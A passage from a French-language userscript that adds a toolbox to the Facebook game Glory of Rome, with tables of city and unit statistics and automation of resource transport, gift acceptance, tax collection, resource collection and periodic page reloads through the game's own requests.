    	  	for(i=0; i<Cities.numCities; i++) {
    	  	       color='black';
    	  	       if ( parseInt(Cities.cities[i].c.resources[1].hourlyTotalRate()) < parseInt(Cities.cities[i].c.upkeep()) ) {
    	  	        // entretien supérieur à la production
    	  	        difference = parseInt(Cities.cities[i].c.resources[1].hourlyTotalRate()) - parseInt(Cities.cities[i].c.upkeep());
    	  	        var timeLeft = parseInt(Cities.cities[i].c.resources[1].count)  / (0-difference) * 3600;
    			if (timeLeft > 86313600)
    			       autonomi = '----';
    			else {
    			      if (timeLeft<(Options.foodWarnHours*3600)) {
			     			     autonomi = '<SPAN class=whiteOnRed><b>'+ timestrShort(timeLeft) +'</b></span>';
			     			 } else {
			     			   autonomi = ''+ timestrShort(timeLeft) +'';
			 }
                    	}
    	  	        m += "<TD align=right width=81 style='background:#e8e8e8;color:"+color+";'>"+ autonomi +"</td>";
    	  	       } else {
    	  	       
    	  	         m += "<TD align=right width=81 style='background:#e8e8e8;color:black;'>---</td>";
    	  	       }
    	 	          
    
    	 	}
    	 str += "<tr><td style='background: #e8e8e8' align=right><b>Autonomie</td><td style='background: #e8e8e8' align=right>&nbsp;"+ m+"</tr>"; 
         var m="";
	 var unitTotal=0;
	  str += "<tr><td><br></td></tr>";
	 if (unsafeWindow.arStrings.unitName["u1"]) {
	  
	 	
	 
	            style = " style = 'background: #e8e8e8'";
	            
	 	 for(var i=0; i<Cities.numCities; i++) {
	 	                        m += "<TD width=81 "+style+" align=right>"+ addCommas(Cities.cities[i].c.troops[1].count()) +'</td>';
	 	                        unitTotal+=parseInt(Cities.cities[i].c.troops[1].count());
	 	 }
	          str += "<tr><td "+style+" align=right><b>"+unsafeWindow.arStrings.unitName["u1"]+"</td><td "+style+" align=right>"+addCommas(unitTotal)+" "+ m + "</tr>"; 
	         
	 }
	   var m="";
	 var unitTotal=0;
	 if (unsafeWindow.arStrings.unitName["u9"]) {
	  
	 	        style = '';
	
	            
	 	 for(var i=0; i<Cities.numCities; i++) {
	 	                        m += "<TD width=81 "+style+" align=right>"+ addCommas(Cities.cities[i].c.troops[9].count()) +'</td>';
	 	                        unitTotal+=parseInt(Cities.cities[i].c.troops[9].count());
	 	 }
	          str += "<tr><td "+style+" align=right><b>"+unsafeWindow.arStrings.unitName["u9"]+"</td><td "+style+" align=right>"+addCommas(unitTotal)+" "+ m + "</tr>"; 
	         
	 }
	         
        str += "<tr><td><br></td></tr>";
    t.statpourTr.innerHTML = str;
    
  
    t.displayTimer = setTimeout (t.show, 2500);
  },
  

  /******* transport ****/
  verifierWagons: function() {
   var t = my.TranspAuto;
   var maxw=parseInt(Cities.cities[t.sourceCity.idx].c.troops[t.typetrp.value].count());
   var saisw=parseInt(t.Choixnbwagon.value);
   if (saisw > maxw) {
      t.Choixnbwagon.value=maxw;
      t.divTranportStatus.innerHTML = '<FONT COLOR=#550000>La quantit&eacute; ne peut exc&eacute;der '+maxw+' !.</font>';
   }
   t.estimerRes();
  },
  estimerRes: function() {
   var t = my.TranspAuto;
   
   
   var esti = parseInt(unsafeWindow.Unit.stats[t.typetrp.value].load * t.Choixnbwagon.value * (1 + (unsafeWindow.player.technologies[10].bonus())));
    t.estimationRes.innerHTML = "<font size=3><b>" + addCommas(esti) + "</b></font>";
   //t.estimationRes.innerHTML += "<br>Estimation temps de marche : <b>" + m.friendEtaStr + "</b>" ; 
   
   // test sur les ressources choisit !
   
   var cityID = t.sourceCity.c.id;
   var ic=0;
   var resact=0;
   var ic_ty="gold"; 
   var ic_text="d'argent";
   resact = Cities.cities[t.sourceCity.idx].c.silver();
   if (document.getElementById("ChoixRess1").checked) { ic_ty="rec1";ic=1;ic_text="de nourriture";resact = parseInt(Cities.cities[t.sourceCity.idx].c.resources[1].count); }
   if (document.getElementById("ChoixRess2").checked) { ic_ty="rec2";ic=2;ic_text="de bois";resact = parseInt(Cities.cities[t.sourceCity.idx].c.resources[2].count); }
   if (document.getElementById("ChoixRess3").checked) { ic_ty="rec3";ic=3;ic_text="de pierre";resact = parseInt(Cities.cities[t.sourceCity.idx].c.resources[3].count); }
   if (document.getElementById("ChoixRess4").checked) { ic_ty="rec4";ic=4;ic_text="de fer";resact = parseInt(Cities.cities[t.sourceCity.idx].c.resources[4].count); }

  
   if (resact < esti) {
     var nbparunit = parseInt(unsafeWindow.Unit.stats[t.typetrp.value].load * 1 * (1 + (unsafeWindow.player.technologies[10].bonus())));
     var uniteness = Math.round(resact / nbparunit) - 1;
     t.Choixnbwagon.value = uniteness;
     t.TTbutTransport.disabled = false;
     t.estimerRes();

   } else {
    //t.TTbutTransport.disabled = false;
   }
   
  }, 
  
  clickUniteMax: function() {
    var t = my.TranspAuto;
    var maxw=parseInt(Cities.cities[t.sourceCity.idx].c.troops[t.typetrp.value].count());
    t.Choixnbwagon.value=maxw;
    t.estimerRes();
  },
  clickTransportDo: function() {   // fonction pour faire le transport
   var t = my.TranspAuto;
   var SourceId = t.sourceCity.c.id;
   
   var DestinationId = t.destinationCity.c.id;

   //nHtml.Click(document.getElementById("city_"+SourceId));
   unsafeWindow.KB.AudioManager.playSound('on_click');
   unsafeWindow.Chrome.City.switchTo(SourceId);
   if (!document.getElementById("ChoixRess0").checked && !document.getElementById("ChoixRess1").checked && !document.getElementById("ChoixRess2").checked && !document.getElementById("ChoixRess3").checked && !document.getElementById("ChoixRess4").checked) {
       t.divTranportStatus.innerHTML = '<FONT COLOR=#550000>Merci de cocher un type de ressource !</font>';
      return;
   }
   if (t.sourceCity.c.x==t.destinationCityx.value && t.sourceCity.c.y==t.destinationCityy.value) {
      t.divTranportStatus.innerHTML = '<FONT COLOR=#550000>Impossible sur les m&ecirc; mes villes !.</font>';
     return;
   }
   if (parseInt(t.Choixnbwagon.value)=="0") {
   t.divTranportStatus.innerHTML = '<FONT COLOR=#550000>Impossible de transporter avec 0 unit&eacute;e... pfff !.</font>';
     return;
   }
   var x=t.destinationCityx.value;
   var y=t.destinationCityy.value;
   if (x == 0 || y == 0) {
      t.divTranportStatus.innerHTML = '<FONT COLOR=#550000>Impossible de transporter sur la destination 0,0 !.</font>';
     return;
   }
   t.TTbutTransport.disabled=true;
   
   var c={};
   c.kid = 0;
   c.cid= t.sourceCity.c.id;
   c.type = "1";
   c.xcoord = x;
   c.ycoord = y;
   c.r1 = 0;
   c.r2 = 0; 
   c.r3 = 0; 
   c.r4 = 0; 
   c.gold = 0; 
   var cc=0;
   var esti =  parseInt(unsafeWindow.Unit.stats[t.typetrp.value].load * t.Choixnbwagon.value * (1 + (unsafeWindow.player.technologies[10].bonus())));
   if (document.getElementById("ChoixRess0").checked) { cc=0;c.gold = esti; }
   if (document.getElementById("ChoixRess1").checked) { cc=1;c.r1 = esti; }
   if (document.getElementById("ChoixRess2").checked) { cc=2;c.r2 = esti; }
   if (document.getElementById("ChoixRess3").checked) { cc=3;c.r3 = esti; }
   if (document.getElementById("ChoixRess4").checked) { cc=4;c.r4 = esti; }


  t.divTranportStatus.innerHTML = "<i><b>En cours de traitement....</b></i>";
  
  setTimeout(function() {
  unsafeWindow.Modal.hideModalAll();
  unsafeWindow.March.open(1,x,y);
 
  setTimeout(function() {
  
   document.getElementById("modal_attack_unit_ipt_"+t.typetrp.value).value=t.Choixnbwagon.value;
   unsafeWindow.March.TroopList.save(t.typetrp.value, document.getElementById("modal_attack_unit_ipt_"+t.typetrp.value));
   unsafeWindow.March.checkTroopInput(document.getElementById("modal_attack_unit_ipt_"+t.typetrp.value), t.typetrp.value, true);
   document.getElementById("modal_attack_resource_"+cc).value=esti;
   unsafeWindow.March.checkResourceInput(document.getElementById("modal_attack_resource_"+cc));
   unsafeWindow.March.updateSummary();
   
   unsafeWindow.March.check(1);
   
   t.divTranportStatus.innerHTML ="<font color=red size='3px'><b>Effectu&eacute;<b></font>";
   t.TTbutTransport.disabled=false; 
  
  },1000);
 
   },200);

          
     
  },
  
  clickCitySourceSelect : function (city){
    var t = my.TranspAuto;
    t.sourceCity = city;
    t.TTbutTransport.disabled=false;
    // en cas de changement de ville, faire le test et mettre quantite max
    //var maxw=parseInt(rows[t.typetrp.value][t.sourceCity.idx]);
    //var saisw=parseInt(t.Choixnbwagon.value);
    //if (saisw > maxw)  t.Choixnbwagon.value=maxw;
    t.estimerRes();
   },
   clickCityDestinationSelect : function (city){
    var t = my.TranspAuto;
    t.destinationCity = city;
    t.destinationCityx.value=t.destinationCity.c.x;
    t.destinationCityy.value=t.destinationCity.c.y;
    t.TTbutTransport.disabled=false;
    t.estimerRes();
   }, 
 
}

my.KDO = {
  cont : null,
  state : null,
  displayTimerKDO:null,
  displayTimerAcceptKDO:null,
  init : function (div){
    var t = my.KDO;
    this.cont = document.createElement('div');
    return t.cont;
  },
  

  getContent : function (){
    var t = my.KDO;
    return t.cont;
  },

  hide : function (){
    var t = my.KDO;
  },
  nbitem: function(id) {
   var nb=0;
   if (unsafeWindow.items[id].count>0){
     nb=unsafeWindow.items[id].count;
   }else{
     nb=0;
   }
   return nb;
  },
  show : function (){ 
    var t = my.KDO;
    
     if (t.state == null){
    m='<div id="presentModalWrapper1" class="presentWrapper"><div class=header style="height:330px"><h1>Choisis un Cadeau GRATUIT &agrave; envoyer &agrave; tes Amis!</h1><ul id="presentList1" class="clearfix">\
<li class="unlocked"><div class="frame"><div class="item pic px70 items item_1005"></div></div><button class="button25" onclick="KB.Views.Gift.popupInvite(1005);"><span>Envoyer</span></button><button id="BOItem1005" class="button25" type="button"><span>Utiliser</span></button><div class="itemowned">Acquis: <span class="modal_itemowned_923" id="BONbItem1005">'+ t.nbitem(1005) +'</span></div></li>\
<li class="unlocked"><div class="frame"><div class="item pic px70 items item_1015"></div></div><button class="button25" onclick="KB.Views.Gift.popupInvite(1015);"><span>Envoyer</span></button><button id="BOItem1015"  class="button25" type="button"><span>Utiliser</span></button><div class="itemowned">Acquis: <span class="modal_itemowned_923" id="BONbItem1015">'+ t.nbitem(1015) +'</span></div></li>\
<li class="unlocked"><div class="frame"><div class="item pic px70 items item_1025"></div></div><button class="button25" onclick="KB.Views.Gift.popupInvite(1025);"><span>Envoyer</span></button><button id="BOItem1025"  class="button25" type="button"><span>Utiliser</span></button><div class="itemowned">Acquis: <span class="modal_itemowned_923" id="BONbItem1025">'+ t.nbitem(1025) +'</span></div></li>\
<li class="unlocked"><div class="frame"><div class="item pic px70 items item_1035"></div></div><button class="button25" onclick="KB.Views.Gift.popupInvite(1035);"><span>Envoyer</span></button><button id="BOItem1035"  class="button25" type="button"><span>Utiliser</span></button><div class="itemowned">Acquis: <span class="modal_itemowned_923" id="BONbItem1035">'+ t.nbitem(1035) +'</span></div></li>\
<li class="unlocked"><div class="frame"><div class="item pic px70 items item_1045"></div></div><button class="button25" onclick="KB.Views.Gift.popupInvite(1045);"><span>Envoyer</span></button><button id="BOItem1045"  class="button25" type="button"><span>Utiliser</span></button><div class="itemowned">Acquis: <span class="modal_itemowned_923" id="BONbItem1045">'+ t.nbitem(1045) +'</span></div></li>\
</ul></div>\
<br><h1>Cadeaux en attente</h1><br><input type=button id="BOAcceptAllKDO" value="Accepter les KDO automatiquement"></div>';
    
t.cont.innerHTML = m;

  
document.getElementById('BOAcceptAllKDO').addEventListener ('click', function(){
      document.getElementById('BOAcceptAllKDO').disabled=true;
       unsafeWindow.AjaxCall.gNetworkPostRequest("requests","getRequest.php",{typeRequest:1},function(m){
         if (m.ok){
           var v=unsafeWindow.Object.keys(m.data.requests);
           unsafeWindow.KB.Views.Cohort.pending = m.data.requests;
      
           for(var f=0;f<v.length;f++){
            
            
            var d=m.data.requests[v[f]][1]; // item
            var b=v[f]; //request_id
            var c={request_id:b , type_request:1, item_id: d, sender_fbuid:m.data.requests[v[f]][0]};
            unsafeWindow.AjaxCall.gNetworkPostRequest("requests","acceptRequest.php",c,function(e){
             if (e.ok) {
              unsafeWindow.items[d].add(1);
              delete unsafeWindow.KB.Views.Gift.request[b];
             }
            },function(e) {}, true);
           }
          }

          document.getElementById('BOAcceptAllKDO').disabled=false;  
       });
   },false);	

   // Bouton utiliser Pierre	      
   document.getElementById("BOItem1035").addEventListener ('click', function(){
    if (t.nbitem(1035)>0) {
     var b={iid:1035,cid:unsafeWindow.currentCity.id};
     unsafeWindow.AjaxCall.gPostRequest("resourceCrate.php",b,function(d){
      if (d.ok) {
       unsafeWindow.KB.Models.Resource.addToSeed(d.rtype,d.amt);
       unsafeWindow.items[1035].subtract();
       document.getElementById("BONbItem1035").innerHTML=t.nbitem(1035);    
      }
     }, function(d) {});
    }
   },false);
      // Bouton utiliser Fer	      
      document.getElementById("BOItem1045").addEventListener ('click', function(){
       if (t.nbitem(1045)>0) {
        var b={iid:1045,cid:unsafeWindow.currentCity.id};
        unsafeWindow.AjaxCall.gPostRequest("resourceCrate.php",b,function(d){
         if (d.ok) {
         unsafeWindow.KB.Models.Resource.addToSeed(d.rtype,d.amt);
         unsafeWindow.items[1045].subtract();
         document.getElementById("BONbItem1045").innerHTML=t.nbitem(1045);
         }
          }, function(d) {});
       }
   },false);
   // Bouton utiliser Bois	      
         document.getElementById("BOItem1025").addEventListener ('click', function(){
          if (t.nbitem(1025)>0) {
           var b={iid:1025,cid:unsafeWindow.currentCity.id};
           unsafeWindow.AjaxCall.gPostRequest("resourceCrate.php",b,function(d){
            if (d.ok) {
            unsafeWindow.KB.Models.Resource.addToSeed(d.rtype,d.amt);
            unsafeWindow.items[1025].subtract();
            document.getElementById("BONbItem1025").innerHTML=t.nbitem(1025);
            }
             }, function(d) {});
          }
   },false);
      // Bouton utiliser Nourriture	      
            document.getElementById("BOItem1015").addEventListener ('click', function(){
             if (t.nbitem(1015)>0) {
              var b={iid:1015,cid:unsafeWindow.currentCity.id};
              unsafeWindow.AjaxCall.gPostRequest("resourceCrate.php",b,function(d){
               if (d.ok) {
               unsafeWindow.KB.Models.Resource.addToSeed(d.rtype,d.amt);
               unsafeWindow.items[1015].subtract();
               document.getElementById("BONbItem1015").innerHTML=t.nbitem(1015);
               }
                }, function(d) {});
             }
   },false);
      // Bouton utiliser Argent	      
            document.getElementById("BOItem1005").addEventListener ('click', function(){
             if (t.nbitem(1005)>0) {
              var b={iid:1005,cid:unsafeWindow.currentCity.id};
              unsafeWindow.AjaxCall.gPostRequest("resourceCrate.php",b,function(d){
               if (d.ok) {
               unsafeWindow.KB.Models.Resource.addToSeed(d.rtype,d.amt);
               unsafeWindow.items[1005].subtract();
               document.getElementById("BONbItem1005").innerHTML=t.nbitem(1005);
               }
                }, function(d) {});
             }
   },false);
   
   
	          
    c={};
    
    unsafeWindow.AjaxCall.gNetworkPostRequest("requests","getFriendsGift.php",c,function(e){
     unsafeWindow.KB.Views.Gift.friends=e.data.friends?e.data.friends:{};
     unsafeWindow.KB.Views.Gift.potentials=e.data.potentials?e.data.potentials:{};
     unsafeWindow.KB.Views.Gift.cohorts=e.data.cohorts?e.data.cohorts:{};
     unsafeWindow.KB.Views.Gift.lockGift=e.data.lockedItems?e.data.lockedItems:{};
     unsafeWindow.KB.Views.Gift.sortLockGift();
     unsafeWindow.KB.Views.Gift.unlockGift=e.data.newUnlockItems?e.data.newUnlockItems:{};
     unsafeWindow.KB.Views.Gift.user=e.data.user?e.data.user:0;    
     var f={typeRequest:unsafeWindow.KB.Views.Gift.TYPE_REQUEST_GIFT};

      
    });
    
    
     t.state = 1;
    }
    
    document.getElementById("BONbItem1045").innerHTML=t.nbitem(1045);  
    document.getElementById("BONbItem1035").innerHTML=t.nbitem(1035);  
    document.getElementById("BONbItem1025").innerHTML=t.nbitem(1025);  
    document.getElementById("BONbItem1015").innerHTML=t.nbitem(1015); 
    document.getElementById("BONbItem1005").innerHTML=t.nbitem(1005); 
        
    t.displayTimer = setTimeout (t.show, parseInt(GlobalOptions.BOAutomateKDOsec*1000));
    
    
  },
  togOpt : function (checkboxId, optionName, callOnChange){
      var t = my.Options;
      var checkbox = document.getElementById(checkboxId);
      if (Options[optionName])
        checkbox.checked = true;
      checkbox.addEventListener ('change', eventHandler, false);
      function eventHandler (){
        Options[optionName] = this.checked;
        saveOptions();
        if (callOnChange)
          callOnChange (this.checked);
      }
    },
    
    changeOpt : function (valueId, optionName, callOnChange){
      var t = my.Options;
      var e = document.getElementById(valueId);
      e.value = Options[optionName];
      e.addEventListener ('change', eventHandler, false);
      function eventHandler (){
        Options[optionName] = this.value;
        saveOptions();
        if (callOnChange)
          callOnChange (this.value);
      }
    },
}
my.Crests = {
  cont : null,
  state : null,

  init : function (div){
    var t = my.Crests;
    this.cont = document.createElement('div');
    return t.cont;
  },
  

  getContent : function (){
    var t = my.Crests;
    return t.cont;
  },

  hide : function (){
    var t = my.Crests;
  },

  show : function (){ 
    var t = my.Crests;
    
   
	var auguste,tiberus,caligula,claude,vespasien;
	if (unsafeWindow.items[1101].count>0){auguste=unsafeWindow.items[1101].count}else{auguste=0};
	if (unsafeWindow.items[1102].count>0){tiberus=unsafeWindow.items[1102].count}else{tiberus=0};
	if (unsafeWindow.items[1103].count>0){caligula=unsafeWindow.items[1103].count}else{caligula=0};
	if (unsafeWindow.items[1104].count>0){claude=unsafeWindow.items[1104].count}else{claude=0};
	if (unsafeWindow.items[1105].count>0){vespasien=unsafeWindow.items[1105].count}else{vespasien=0};
if (unsafeWindow.items[1106].count>0){titus=unsafeWindow.items[1106].count}else{titus=0};
if (unsafeWindow.items[1107].count>0){Domitien=unsafeWindow.items[1107].count}else{Domitien=0};
if (unsafeWindow.items[1108].count>0){Trajan=unsafeWindow.items[1108].count}else{Trajan=0};
if (unsafeWindow.items[1109].count>0){Hadrien=unsafeWindow.items[1109].count}else{Hadrien=0};
	if (Cities.cities[1]){ville2="#99EE99";}else{ville2="#EE9999";}
	if (Cities.cities[2]){ville3="#99EE99";}else{ville3="#EE9999";}
	if (Cities.cities[3]){ville4="#99EE99";}else{ville4="#EE9999";}
   	if (Cities.cities[4]){ville5="#99EE99";}else{ville5="#EE9999";}
   if (t.state == null){
    
var m = '<style>CAPTION.MYTABLE  {background-color:eeffff;color:black;     border-style:solid;     border-width:1px;     border-color:black;  }\
  TABLE.MYTABLE  {font-family:arial;border-collapse:collapse;font-size:12pt;background-color:F5F5F5;width:100%;border-style:solid;border-color:black;border-width:1px;  }\
  TH.MYTABLE  {font-size:12pt;color:black;text-align:center;border-style:solid;border-color:black;border-width:1px;  }\
  TR.MYTABLE  {  }\
  TD.MYTABLE  {font-size:12pt;background-color:FFFFE5;color:black;border-style:solid;border-width:1px;text-align:left;}</style>\
<DIV class=ptstat>INFORMATION UNITEES</div><TABLE align=center CLASS="MYTABLE" cellpadding=4 cellspacing=0><tr><td>Unite</td><td>Vie</td><td>Attaque</td><td>D&eacute;fense</td><td>Vitesse</td><td>Port&eacute;e</td><td>Charge</td><td>Entretien</td></tr>';
var unitupkeeps={"1":2,"2":3,"3":5,"4":9,"5":35,"6":9,"7":9,"8":35,"9":10,"10":35,"11":50,"12":100,"31":65};
for (var nbu=1; nbu<=31;nbu++) {
 if (unsafeWindow.arStrings.unitName["u"+nbu]) {
 m+="<tr><td>"+unsafeWindow.arStrings.unitName["u"+nbu]+"</td>";
 m+="<td>"+unsafeWindow.Unit.stats[nbu].life+"</td>";
 m+="<td>"+unsafeWindow.Unit.stats[nbu].attack+"</td>";
 m+="<td>"+unsafeWindow.Unit.stats[nbu].defense+"</td>";
 m+="<td>"+unsafeWindow.Unit.stats[nbu].speed+"</td>";
 m+="<td>"+unsafeWindow.Unit.stats[nbu].range+"</td>";
 m+="<td>"+unsafeWindow.Unit.stats[nbu].load+"</td>";
 m+="<td>"+unitupkeeps[nbu]+"</td>";
 m+="</tr>";
 
 }
}

m +='</table><br><TABLE CLASS="MYTABLE" CELLPADDING=3 CELLSPACING=0 align=center>\
    <CAPTION CLASS="MYTABLE"><DIV class=ptstat>LES SCEAUX</div></CAPTION>\
    <THEAD >\
      <TR CLASS="MYTABLE">\
        <TH CLASS="MYTABLE">Cit&eacute;</TH>\
        <TH CLASS="MYTABLE">Besoins</TH>\
      </TR>\
    </THEAD>\
    <TBODY>\
      <TR CLASS="MYTABLE">\
        <TD CLASS="MYTABLE" style="background-color:'+ville2+';"><b><center>Cit&eacute; 2</TD>\
        <TD CLASS="MYTABLE" style="background-color:'+ville2+';">Niveau 7 (Actuellement : ' + unsafeWindow.player.level + ')\
        <br>5 Cohortes</TD>\
      </TR>\
      <TR CLASS="MYTABLE">  \
        <TD CLASS="MYTABLE" style="background-color:'+ville3+';"><b><center>Cit&eacute; 3</TD>\
        <TD CLASS="MYTABLE" style="background-color:'+ ( (auguste>=10 && tiberus>=5 && caligula>=2)?"#99EE99":ville3 ) +';">'+auguste+' / 10 '+unsafeWindow.arStrings.itemName["i1101"]+'<br>'+tiberus+' / 5 '+unsafeWindow.arStrings.itemName["i1102"]+'<br>'+caligula+' / 2 '+unsafeWindow.arStrings.itemName["i1103"]+'</TD>\
      </TR>\
            <TR CLASS="MYTABLE">  \
              <TD CLASS="MYTABLE" style="background-color:'+ville4+';"><b><center>Cit&eacute; 4</TD>\
              <TD CLASS="MYTABLE" style="background-color:'+ ( (auguste>=20 && tiberus>=15 && caligula>=9)?"#99EE99":ville4 ) +';">'+auguste+' / 20 '+unsafeWindow.arStrings.itemName["i1101"]+'\
              <br>'+tiberus+' / 15 '+unsafeWindow.arStrings.itemName["i1102"]+'\
              <br>'+caligula+' / 9 '+unsafeWindow.arStrings.itemName["i1103"]+'\
              <br>'+claude+' / 4 '+unsafeWindow.arStrings.itemName["i1104"]+'\
              <br>'+vespasien+' / 2 '+unsafeWindow.arStrings.itemName["i1105"]+'\
              </TD>\
      </TR>\
            </TR>\
                  <TR CLASS="MYTABLE">  \
                    <TD CLASS="MYTABLE" style="background-color:'+ville5+';"><b><center>Cit&eacute; 5</TD>\
                    <TD CLASS="MYTABLE" style="background-color:'+ ( (caligula>=20 && claude>=15 && vespasien>=9 && titus>=4 && Domitien>=2)?"#99EE99":ville5 ) +';">'+caligula+' / 20 '+unsafeWindow.arStrings.itemName["i1103"]+'\
                    <br>'+claude+' / 15 '+unsafeWindow.arStrings.itemName["i1104"]+'\
                    <br>'+vespasien+' / 9 '+unsafeWindow.arStrings.itemName["i1105"]+'\
                    <br>'+titus+' / 4 '+unsafeWindow.arStrings.itemName["i1106"]+'\
                    <br>'+Domitien+' / 2 '+unsafeWindow.arStrings.itemName["i1107"]+'\
                    </TD>\
      </TR>\
          </TR>\
       <TR CLASS="MYTABLE">  \
         <TD CLASS="MYTABLE" style="background-color:'+ville5+';"><b><center>Cit&eacute; 6</TD>\
         <TD CLASS="MYTABLE">Inconnu....</TD>\
      </TR>\
    </TBODY>\
  </TABLE>';
      t.cont.innerHTML = m;
      t.state = 1;
    }
  },

}

/************************ Gold Collector ************************/
var CollectGold = {
  timer : null,
  lastCollect : {},
      
  init : function (){
    var t = CollectGold;
    for (var c=0; c<Cities.numCities; c++)
      t.lastCollect['c'+ Cities.cities[c].c.id] = 0;
    if (Options.pbGoldEnable)
      t.setEnable (true);
  },
  
  setEnable : function (tf){
    var t = CollectGold;
    clearTimeout (t.timer);
    if (tf)
      t.tick();
  },

  colCityName : null,
  colHappy : 0,  
  tick : function (){
    var t = CollectGold;
    for (var c=0; c<Cities.numCities; c++){
      var city = Cities.cities[c];
      var since = unixTime() - t.lastCollect['c'+city.c.id];
      if (since>15*60 && city.c.population.happiness()>=Options.pbGoldHappy){
        t.lastCollect['c'+city.c.id] = unixTime();
        t.colCityName = city.c.name;
        t.ajaxCollectGold (city.c, t.e_ajaxDone); 
        break;
      }
    }
    t.timer = setTimeout (t.tick, 30000);    
  },

  e_ajaxDone : function (rslt){
    var t = CollectGold;
  },
  
  ajaxCollectGold : function (city, notify){
    var c={};
    c.cid=city.id;
    c.eventid=1;
    unsafeWindow.AjaxCall.gPostRequest("coliseumEvent.php",c,
    function(rslt){
       if (notify)  
        notify (rslt);
      }, function (rslt) {
        if (notify)  
          notify (rslt);
      }
    );
  },
}

/************************ Collecte de ressources en auto ************************/
var CollectRessource = {
  timer : null,
  lastCollect : {},
      
  init : function (){
    var t = CollectRessource;
    for (var c=0; c<Cities.numCities; c++)
      t.lastCollect['c'+ Cities.cities[c].c.id] = 0;
    if (Options.pbRessEnable)
      t.setEnable (true);
  },
  
  setEnable : function (tf){
    var t = CollectRessource;
    clearTimeout (t.timer);
    if (tf)
      t.tick();
  },

  colCityName : null,
  colHappy : 0,  
  tick : function (){
    var t = CollectRessource;
    for (var c=0; c<Cities.numCities; c++){
      var city = Cities.cities[c];
      var since = unixTime() - t.lastCollect['c'+city.c.id];
       if (since>Options.pbRessTime*60 && document.getElementById("btn_collect_all").style.display!='none'){ //AutoCollect
        t.lastCollect['c'+city.c.id] = unixTime();
        t.colCityName = city.c.name;
        t.ajaxCollectRessource (city.c, t.e_ajaxDone); 
        break;
      }
    }
    t.timer = setTimeout (t.tick, 30000);    
  },

  e_ajaxDone : function (rslt){
    var t = CollectRessource;
  },
  
  ajaxCollectRessource : function (city, notify){
    var c={};
    c.cid=city.id;
    unsafeWindow.AjaxCall.gPostRequest("collectResource.php",c,
    function(rslt){
       if (notify)  
        notify (rslt);
      }, function (rslt) {
        if (notify)  
          notify (rslt);
      }
    );
  },
}

/************************ Refresh Every X minutes ************************/
var RefreshEvery  = {
  timer : null,
  PaintTimer : null,
  NextRefresh : 0,
  box : null,
  target : null,
  
  init : function (){
    var t = RefreshEvery;
	t.creatediv();
	if (Options.pbEveryMins < 1)
        Options.pbEveryMins = 1;
    RefreshEvery.setEnable (Options.pbEveryEnable);
  },
  
  creatediv : function(){
    var t = RefreshEvery;
	t.target = document.getElementById('comm_tabs');
	if(t.target == null){
		setTimeout(t.creatediv, 2000);
		return;
	}
	t.box = document.createElement('div');
	t.box.style.top = "-30px";
	t.box.style.position="absolute";
	t.target.appendChild(t.box);
  },
  
  setEnable : function (tf){
    var t = RefreshEvery;
    clearTimeout (t.timer);
    if (tf) {
      //t.timer = setTimeout (t.doit, Options.pbEveryMins*60000);
      t.NextRefresh = unixTime() + (Options.pbEveryMins*60); 
      t.timer = setTimeout (t.Paint, 5000);
    } else {
        //t.PaintTimer = null;
		t.timer = null;
		t.NextRefresh = 0;
		t.box.innerHTML = '';
	}
  },
  
  doit : function (){
    reloadKOC();
  },
  
  setTimer : function (){
    var t = RefreshEvery;
    clearTimeout (t.timer);
    if (Options.pbEveryMins < 1) Options.pbEveryMins = 1;
    RefreshEvery.setEnable (Options.pbEveryEnable);
  },
  
  Paint : function(){
     var t = RefreshEvery;
	 if(t.timer == null) return;
     var now = unixTime();
     var text = '';
     var Left = parseInt(t.NextRefresh - now);
     if ( Left < 0){
		Left = 0;
		t.doit();
	 }
     if ( Left < 60) text += '<BR>&nbsp;&nbsp;&nbsp;&nbsp;<span id=BOTaref><FONT color=RED><span id=BOTaref>Actualisation</span> dans </font><FONT color=RED><B><span id=BOTaTim>'+ timestr(Left) +'</span></b></font></div>';
     else text += '<BR>&nbsp;&nbsp;&nbsp;&nbsp;<FONT color=RED><span id=BOTaref>Actualisation</span> dans <B><span id=BOTaTim>'+ timestr(Left) +'</span></b></font></div>';
    
	 t.box.innerHTML = text;
	 
	document.getElementById('BOTaref').addEventListener ('click', t.doit, false);
	document.getElementById('BOTaTim').addEventListener ('click', function() { t.setEnable(true); }, false);
     t.timer = setTimeout (t.Paint, 5000);
  },
}
function reloadKOC (){
  var serverId = getServerId();
  if(serverId == '??') window.location.reload(true);
  var goto = window.location.protocol+'//apps.facebook.com/gloryofrome/?s='+serverId;
  var t = '<FORM target="_top" action="'+ goto +'" method=post><INPUT id=xxpbButReload type=submit value=RELOAD><INPUT type=hidden name=s value="'+ serverId +'"</form>';
  var e = document.createElement ('div');
  e.innerHTML = t;
  document.body.appendChild (e);
  setTimeout (function (){ById('xxpbButReload').click();}, 0);
}
/*********************************** Options Tab ***********************************/

my.Options = {
  cont : null,
  state : null,
  fixAvailable : {},

  init : function (){
    var t = my.Options;
    t.cont = document.createElement('div');
    return t.cont;
  },


  getContent : function (){
    var t = my.Options;
    return t.cont;
  },

  togOpt : function (checkboxId, optionName, callEnable, callIsAvailable){
    var t = my.Options;
    var checkbox = document.getElementById(checkboxId);
    
    if (callIsAvailable && callIsAvailable()==false){
      checkbox.disabled = true;
      return;
    }
    if (Options[optionName])
      checkbox.checked = true;
    checkbox.addEventListener ('change', new eventToggle(checkboxId, optionName, callEnable).handler, false);
    function eventToggle (checkboxId, optionName, callOnChange){
      this.handler = handler;
      var optName = optionName;
      var callback = callOnChange;
      function handler(event){
        Options[optionName] = this.checked;
        saveOptions();
        if (callback != null)
          callback (this.checked);
      }
    }
  },


  show : function (){
    var t = my.Options;
      try {      
        m = '<DIV style="height:580px; max-height:580px; overflow-y:auto"><TABLE class=ptTab>\
          <TR><TD colspan=2><font size=4><B><u>Configuration Boite &agrave; outils :</u></b></font><br></td></tr>\
          <TR><TD><INPUT id=ptAllowWinMove type=checkbox /></td><TD>Activer le d&eacute;placement de la fen&ecirc;tre de la boite</td></tr>\
         <TR><TD><INPUT id=pbEveryEnable type=checkbox /></td><TD>Actualiser GOR toutes les <INPUT id=pbeverymins type=text size=2 maxlength=3 \> minutes</td>\
         <TR><TD><INPUT id=pbGoldEnable type=checkbox /></td><TD>Organiser automatiquement le jour d\'imposition (si bonheur >= <INPUT id=pbgoldLimit type=text size=2 maxlength=3 \>%)</td></tr>\
         <TR><TD><INPUT id=pbRessEnable type=checkbox /></td><TD>Auto collecte des ressources toutes les <INPUT id=pbLimitRess type=text size=2 maxlength=3 \> minutes</td></tr>\
        <TR><TD>&nbsp;</td><td>Montrer l\'autonomie en rouge &agrave; partir de <INPUT id=optFoodHours type=text size=3 value="'+ Options.foodWarnHours +'"> heures</td></tr>\
